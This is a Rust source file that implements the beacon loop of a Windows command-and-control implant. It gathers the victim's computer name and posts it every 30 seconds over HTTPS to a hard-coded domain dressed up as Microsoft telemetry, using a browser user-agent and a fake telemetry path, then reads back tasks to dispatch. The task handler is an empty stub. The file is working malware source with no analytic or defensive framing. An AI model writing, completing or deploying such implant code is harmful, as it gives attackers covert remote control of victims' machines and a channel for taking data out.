//! c2.rs — HTTP/S beacon loop using WinHTTP
#![allow(dead_code, non_snake_case, non_upper_case_globals)]

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::winhttp::{
    WinHttpOpen, WinHttpConnect, WinHttpOpenRequest,
    WinHttpSendRequest, WinHttpReceiveResponse, WinHttpReadData,
    WinHttpCloseHandle, WinHttpSetOption, WinHttpQueryHeaders,
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    WINHTTP_FLAG_SECURE,
    WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
};
use winapi::um::sysinfoapi::GetComputerNameW;
use winapi::shared::minwindef::MAX_PATH;

// Constants not exported by all winapi versions
const WINHTTP_NO_PROXY_NAME:          *mut u16 = core::ptr::null_mut();
const WINHTTP_NO_PROXY_BYPASS:        *mut u16 = core::ptr::null_mut();
const WINHTTP_QUERY_STATUS_CODE:      DWORD    = 19;
const WINHTTP_QUERY_FLAG_NUMBER:      DWORD    = 0x20000000;
const WINHTTP_OPTION_CONNECT_TIMEOUT: DWORD    = 3;
const WINHTTP_OPTION_SEND_TIMEOUT:    DWORD    = 5;
const WINHTTP_OPTION_RECEIVE_TIMEOUT: DWORD    = 6;

const SLEEP_MS:       u32  = 30_000;
const C2_HOST:        &str = "update.microsoft-cdn.net";
const C2_PORT:        u16  = 443;
const C2_BEACON_PATH: &str = "/telemetry/v2/collect";
const TIMEOUT:        DWORD = 10_000;

fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

unsafe fn build_beacon() -> Vec<u8> {
    let mut name_buf = [0u16; MAX_PATH];
    let mut name_len: DWORD = MAX_PATH as DWORD;
    GetComputerNameW(name_buf.as_mut_ptr(), &mut name_len);
    let hostname = String::from_utf16_lossy(&name_buf[..name_len as usize]);
    let host_bytes = hostname.as_bytes();
    let copy_len   = host_bytes.len().min(16);
    let mut beacon = vec![0u8; 24];
    beacon[..copy_len].copy_from_slice(&host_bytes[..copy_len]);
    #[cfg(feature = "thread_id_value")]
    {
        let tid = winapi::um::processthreadsapi::GetCurrentThreadId();
        beacon[16..24].copy_from_slice(&(tid as u64).to_le_bytes());
    }
    beacon
}

unsafe fn set_timeout(h: winapi::um::winhttp::HINTERNET, opt: DWORD) {
    let t = TIMEOUT;
    WinHttpSetOption(
        h, opt,
        &t as *const DWORD as LPVOID,
        core::mem::size_of::<DWORD>() as DWORD,
    );
}

unsafe fn post_beacon(body: &[u8]) -> Option<Vec<u8>> {
    let agent = to_wide("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    let host  = to_wide(C2_HOST);
    let verb  = to_wide("POST");
    let path  = to_wide(C2_BEACON_PATH);

    let h_session = WinHttpOpen(
        agent.as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0,
    );
    if h_session.is_null() { return None; }

    set_timeout(h_session, WINHTTP_OPTION_CONNECT_TIMEOUT);
    set_timeout(h_session, WINHTTP_OPTION_SEND_TIMEOUT);
    set_timeout(h_session, WINHTTP_OPTION_RECEIVE_TIMEOUT);

    let h_connect = WinHttpConnect(h_session, host.as_ptr(), C2_PORT, 0);
    if h_connect.is_null() { WinHttpCloseHandle(h_session); return None; }

    let h_request = WinHttpOpenRequest(
        h_connect, verb.as_ptr(), path.as_ptr(),
        core::ptr::null(),
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE,
    );
    if h_request.is_null() {
        WinHttpCloseHandle(h_connect); WinHttpCloseHandle(h_session);
        return None;
    }

    let ct = to_wide("Content-Type: application/octet-stream\r\n");
    let sent = WinHttpSendRequest(
        h_request,
        ct.as_ptr(), ct.len() as DWORD,
        body.as_ptr() as LPVOID,
        body.len() as DWORD,
        body.len() as DWORD,
        0,
    );
    if sent == 0 {
        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
        return None;
    }

    if WinHttpReceiveResponse(h_request, core::ptr::null_mut()) == 0 {
        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
        return None;
    }

    let mut status: DWORD = 0;
    let mut status_len: DWORD = core::mem::size_of::<DWORD>() as DWORD;
    WinHttpQueryHeaders(
        h_request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        core::ptr::null(),
        &mut status as *mut DWORD as LPVOID,
        &mut status_len,
        core::ptr::null_mut(),
    );

    let mut resp = Vec::new();
    if status == 200 {
        let mut buf = [0u8; 4096];
        let mut read: DWORD = 0;
        loop {
            let ok = WinHttpReadData(
                h_request,
                buf.as_mut_ptr() as LPVOID,
                buf.len() as DWORD,
                &mut read,
            );
            if ok == 0 || read == 0 { break; }
            resp.extend_from_slice(&buf[..read as usize]);
            if resp.len() > 1_048_576 { break; }
        }
    }

    WinHttpCloseHandle(h_request);
    WinHttpCloseHandle(h_connect);
    WinHttpCloseHandle(h_session);

    if status == 200 { Some(resp) } else { None }
}

fn dispatch_task(_task: Vec<u8>) {}

pub unsafe fn run() -> ! {
    loop {
        let beacon = build_beacon();
        if let Some(task) = post_beacon(&beacon) {
            if !task.is_empty() { dispatch_task(task); }
        }
        winapi::um::synchapi::Sleep(SLEEP_MS);
    }
}
